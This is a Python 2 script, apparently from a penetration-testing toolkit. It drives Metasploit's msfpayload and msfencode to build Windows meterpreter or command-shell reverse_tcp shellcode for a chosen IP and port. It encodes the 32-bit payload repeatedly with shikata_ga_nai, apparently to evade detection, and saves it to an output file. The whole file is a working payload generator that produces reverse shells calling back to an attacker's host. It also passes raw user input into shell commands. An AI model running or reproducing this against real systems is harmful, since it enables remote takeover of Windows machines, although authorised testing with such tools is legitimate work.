#!/usr/bin/python
#

import subprocess as subp
import os, sys
from src.core import menus
from src.core.main import *
from time import sleep

def shellcodeGen(path, encoding, payload, ip, port, iterations, encoder):
	if encoding == '1':
		PrintInfo("Generating shellcode with x%s %s" % (iterations, encoder))
		print ""
		proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
							% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)

		shellcode = proc.communicate()[0]
		shellcode = shellcode.strip(';')
	
	elif encoding == '2':
		PrintInfo("Generating shellcode")
		print ""
		proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s C | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
							% (path, payload, ip, port), shell=True, stdout=subp.PIPE)

		shellcode = proc.communicate()[0]
		shellcode = shellcode.strip(';')

	return shellcode

while 1:
	try:
		# set msfpath
		path = msfpath()

		# get current dir
		cwd = os.getcwd()

		# interface ip
		iface = iface_ip()

		# select architecture
		# 1 = 32bit
		# 2 = 64bit
		arch = 0
		while arch != range(1,2):
			clear()
			menus.arch_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				arch = "1"
				break
			elif selection == '2':
				arch = "2"
				break
		
		# select 32bit payload
		if arch == '1':
			selection = 0
			encoder = "x86/shikata_ga_nai"
			outfile = "shellcode32.txt"
			while selection != range(1,2):
				clear()
				menus.shellcode32_menu()
				selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
				if selection == '1':
					payload = "windows/meterpreter/reverse_tcp"
					break
				if selection == '2':
					payload = "windows/shell/reverse_tcp"
					break
					
		if arch == '2':
			selection = 0
			encoder = "x64/xor"
			outfile = "shellcode64.txt"
			while selection != range(1,2):
				clear()
				menus.shellcode64_menu()
				selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
				if selection == '1':
					payload = "windows/x64/meterpreter/reverse_tcp"
					break
				if selection == '2':
					payload = "windows/x64/shell/reverse_tcp"
					break

		# shall we encode the payload?
		menus.win_enc_menu()
		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
		if not encoding:
			encoding = "1"
	
		#			
		# get some user info
		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if not port:
			port = 8080
		if encoding == '1' or encoding == '':
			iterations = raw_input(" Number of times to encode shellcode (default 5): ")
			if not iterations:
				iterations = 5

		# generate shellcode
		shellcode = shellcodeGen(path, encoding, payload, ip, port, iterations, encoder)

		# write shellcode to file
		winshellcode = "output/"+outfile
		fw = open(winshellcode, "w")
		fw.write(shellcode)
		fw.close()
		sleep(1)

		# return to main
		PrintInfo("File %s created in output directory" % outfile)
		EntContinue()
		break

	except KeyboardInterrupt:
		break
